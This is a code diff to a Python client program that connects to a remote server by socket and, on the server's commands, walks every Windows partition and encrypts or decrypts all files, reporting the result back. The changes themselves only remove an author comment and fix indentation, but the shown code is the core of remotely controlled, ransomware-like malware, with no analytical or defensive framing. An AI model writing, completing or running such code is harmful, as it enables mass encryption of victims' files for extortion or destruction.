@@ -1,6 +1,3 @@
-#
-# By Mahmoud Ozil
-#
 import os 
 import os.path
 import socket 
@@ -128,15 +125,15 @@ def client():
                 parts = partition_windows()
                 for part in parts :
                     files = dir_f_list(part)
-					for f in files:
+                    for f in files:
                         encryption(key,f)
                 s.send("\n Encryption Has been Done\n")
             if command == "de":
                 parts = partition_windows()
-				for part in parts :
-					files = dir_f_list(part)
-					for f in files : 
-						decryption(key,f)
+                for part in parts :
+                    files = dir_f_list(part)
+                    for f in files : 
+                        decryption(key,f)
                 s.send(b'\n Decryption Has been Done\n')
     except socket.error as e:
         print("trying to connect with server with in 5 sec")
